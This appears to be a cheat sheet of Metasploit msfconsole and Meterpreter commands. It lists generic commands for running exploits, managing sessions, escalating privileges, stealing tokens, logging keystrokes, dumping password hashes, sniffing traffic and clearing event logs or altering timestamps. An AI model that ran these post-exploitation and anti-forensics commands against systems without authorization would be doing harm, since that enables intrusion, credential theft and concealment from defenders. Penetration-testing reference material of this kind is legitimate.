### MSFconsole Commands

- **Show all exploits:**

```bash
show exploits
```

- **Show all payloads:**

```bash
show payloads
```

- **Show all auxiliary modules:**

```bash
show auxiliary
```

- **Search for a module:**

```bash
search <name>
```

- **Load information about a specific module:**

```bash
info
```

- **Load an exploit or module:**

```bash
use <name>
```

- **Load an exploit by index number:**

```bash
use <number>
```

- **Set Local Host IP (LHOST):**

```bash
set LHOST <ip>
```

- **Set Remote Host IP (RHOST):**

```bash
set RHOST <ip>
```

- **Set a specific option value:**

```bash
set <option> <value>
```

- **Set a global option value:**

```bash
setg <option> <value>
```

- **Display available options for a module:**

```bash
show options
```

- **Display supported platforms for the exploit:**

```bash
show targets
```

- **Specify the target index:**

```bash
set target <number>
```

- **Set the desired payload:**

```bash
set payload <payload>
```

- **Display advanced options for a module:**

```bash
show advanced
```

- **Automatically migrate to another process after exploitation:**

```bash
set autorunscript migrate -f
```

- **Check if a target is vulnerable:**

```bash
check
```

- **Execute the module or exploit:**

```bash
exploit
```

- **Run the exploit in the background:**

```bash
exploit -j
```

- **Run without interacting with the session:**

```bash
exploit -z
```

- **Specify a payload encoder:**

```bash
exploit -e <encoder>
```

- **Display help for the exploit command:**

```bash
exploit -h
```

- **List available sessions:**

```bash
sessions -l
```

- **List sessions with verbose details:**

```bash
sessions -v
```

- **Run a script on all live sessions:**

```bash
sessions -s <script>
```

- **Kill all active sessions:**

```bash
sessions -K
```

- **Run a command across all sessions:**

```bash
sessions -c <cmd>
```

- **Upgrade a shell to a Meterpreter session:**

```bash
sessions -u <sessionID>
```

- **Create a new database:**

```bash
db_create <name>
```

- **Connect to an existing database:**

```bash
db_connect <name>
```

- **Use Nmap and store results in the database:**

```bash
db_nmap <args>
```

- **Delete the current database:**

```bash
db_destroy
```

### Meterpreter Commands

- **Display Meterpreter help:**

```bash
help
```

- **Run a Meterpreter script:**

```bash
run <scriptname>
```

- **Show target system information:**

```bash
sysinfo
```

- **List files and directories:**

```bash
ls
```

- **Load the privilege extension:**

```bash
use priv
```

- **List running processes:**

```bash
ps
```

- **Migrate to a specific process by ID:**

```bash
migrate <pid>
```

- **Load incognito functions:**

```bash
use incognito
```

- **List user tokens:**

```bash
list_tokens -u
```

- **List group tokens:**

```bash
list_tokens -g
```

- **Impersonate a token:**

```bash
impersonate_token <DOMAIN\\USERNAME>
```

- **Steal a process token:**

```bash
steal_token <pid>
```

- **Stop token impersonation:**

```bash
drop_token
```

- **Attempt privilege escalation to SYSTEM:**

```bash
getsystem
```

- **Drop into an interactive shell:**

```bash
shell
```

- **Run a command interactively:**

```bash
execute -f <cmd.exe> -i
```

- **Revert to the original user:**

```bash
rev2self
```

- **Interact with the registry:**

```bash
reg <command>
```

- **Switch to another desktop:**

```bash
setdesktop <number>
```

- **Capture a screenshot:**

```bash
screenshot
```

- **Upload a file to the target:**

```bash
upload <file>
```

- **Download a file from the target:**

```bash
download <file>
```

- **Start keylogging:**

```bash
keyscan_start
```

- **Dump captured keystrokes:**

```bash
keyscan_dump
```

- **Stop keylogging:**

```bash
keyscan_stop
```

- **Get available privileges:**

```bash
getprivs
```

- **Take control of input devices:**

```bash
uictl enable <keyboard/mouse>
```

- **Background the current session:**

```bash
background
```

- **Dump password hashes:**

```bash
hashdump
```

- **Load the sniffer module:**

```bash
use sniffer
```

- **List network interfaces:**

```bash
sniffer_interfaces
```

- **Start sniffing on an interface:**

```bash
sniffer_start <id> <packet-buffer>
```

- **Dump captured packets:**

```bash
sniffer_dump <id> <filename>
```

- **Stop packet sniffing:**

```bash
sniffer_stop <id>
```

- **Clear event logs:**

```bash
clearev
```

- **Modify file timestamps:**

```bash
timestomp
```

- **Reboot the target machine:**

```bash
reboot
```